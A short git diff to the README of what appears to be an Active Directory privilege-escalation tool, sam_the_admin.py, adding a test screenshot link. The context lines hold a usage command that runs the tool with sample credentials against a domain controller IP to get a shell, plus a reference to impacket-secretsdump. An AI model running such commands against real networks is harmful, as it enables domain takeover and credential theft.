@@ -20,6 +20,10 @@ change `sam_the_admin.py`:
         # "/usr/bin/impacket-secretsdump"
 ```
 
+## OS TEST
+![image](https://user-images.githubusercontent.com/16593068/146142564-5d573b4e-549e-4ae0-9bfd-72d5fce67108.png)
+
+
 usage:
 
 `python3 sam_the_admin.py "jas502n/John:Admin@123" -dc-ip 172.16.242.135 -shell`
